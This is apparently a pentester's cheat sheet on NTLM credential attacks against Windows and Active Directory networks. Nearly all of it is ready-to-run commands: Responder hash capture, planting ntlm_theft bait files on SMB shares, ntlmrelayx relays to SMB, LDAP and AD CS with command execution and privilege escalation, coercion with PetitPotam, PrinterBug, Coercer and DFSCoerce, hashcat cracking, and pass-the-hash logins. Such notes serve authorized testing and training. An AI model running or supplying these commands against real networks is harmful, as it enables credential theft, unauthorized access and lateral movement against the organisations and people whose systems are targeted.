# NTLM Coercion & Theft

**Tags:** #ntlm #coercion #relay #hash-theft
**Phase:** Lateral Movement / Initial Access

---

## NTLM Capture (Responder)

```bash
# Start Responder — captures NTLM hashes from broadcast/multicast
sudo responder -I tun0 -wrfPv
sudo responder -I eth0 -A    # Analyze mode (passive — no poison)

# Captured hashes saved to:
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt
```

## NTLM Theft (Force Authentication via Files)

```bash
# Generate theft files for every format
python3 ntlm_theft.py -g all -s $LHOST -f steal

# Upload to writable SMB share with Responder running
smbclient //$TARGET/SHARE -U user%pass
smb> mput *    # Upload all generated files

# Formats generated: .lnk, .url, .html, .docx, .xlsx, .xml, etc.
# When victim opens the share → NTLMv2 hash captured
```

## NTLM Relay (ntlmrelayx)

```bash
# Prerequisites: SMB signing disabled on target
nxc smb "$SUBNET" --gen-relay-list relay_targets.txt

# Start relay (Responder in analyze mode + ntlmrelayx)
sudo responder -I tun0 -A
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Interactive shell via relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
nc 127.0.0.1 11000  # Connect to interactive SMB session

# Execute command via relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami > C:\Temp\out.txt"

# Relay to LDAP (AD attacks)
impacket-ntlmrelayx -t ldap://$DC_IP --escalate-user $USER
impacket-ntlmrelayx -t ldaps://$DC_IP --add-computer

# Relay to ADCS web enrollment (ESC8)
impacket-ntlmrelayx -t http://ca.$DOMAIN/certsrv/certfnsh.asp -smb2support --adcs
```

## NTLM Coercion (Trigger Authentication)

```bash
# Printer Bug / SpoolSample (MS-RPRN)
python3 printerbug.py $DOMAIN/$USER:$PASS@$TARGET $LHOST
.\SpoolSample.exe $TARGET $LHOST

# PetitPotam (MS-EFSRPC — no auth needed in some cases)
python3 PetitPotam.py -u $USER -p $PASS $LHOST $TARGET
python3 PetitPotam.py $LHOST $TARGET  # Unauthenticated (unpatched)

# Coercer (consolidated coercion tool)
python3 Coercer.py coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $TARGET

# DFSCoerce (MS-DFSNM)
python3 dfscoerce.py -u $USER -p $PASS $LHOST $TARGET
```

## Crack Captured Hashes

```bash
# NTLMv2 (mode 5600)
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NTLMv1 (mode 5500 — much faster to crack)
hashcat -m 5500 ntlmv1_hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM hash (mode 1000 — local account dump)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Pass-the-Hash (use captured hash directly)

```bash
# No need to crack — use hash directly
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :NTLMv1HASH
evil-winrm -i $TARGET -u $USER -H NTLMHASH
```

## Related Notes

- [[05-Exploitation/Network]] — NTLM capture and relay workflow
- [[06-Lateral-Movement/INDEX]] — Lateral movement with captured hashes
- [[08-Active-Directory/INDEX]] — NTLM relay to AD CS (ESC8)
